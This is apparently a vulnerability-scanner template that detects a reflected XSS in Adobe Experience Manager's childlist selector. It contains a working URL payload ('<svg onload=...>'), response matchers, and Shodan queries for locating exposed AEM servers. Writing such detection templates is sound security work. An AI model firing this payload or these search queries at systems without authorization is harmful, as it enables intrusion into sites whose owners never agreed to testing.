id: aem-xss-childlist-selector

info:
  name: XSS in childlist selector
  author: dhiyaneshDk
  severity: medium
  description: |
    Requests using the selector childlist can an XSS when the dispatcher does not respect the content-type responded by AEM and flips from application/json to text/html. As a consequence the reflected suffix is executed and interpreted in the browser.
  reference:
    - https://github.com/thomashartm/burp-aem-scanner/blob/master/src/main/java/burp/actions/xss/FlippingTypeWithChildrenlistSelector.java
  metadata:
    shodan-query:
      - http.title:"AEM Sign In"
      - http.component:"Adobe Experience Manager"
  tags: xss,aem,adobe

requests:
  - method: GET
    path:
      - '{{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '<svg onload=alert(document.domain)>'
          - '{"path":"/etc/designs/xh1x.childrenlist.json'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
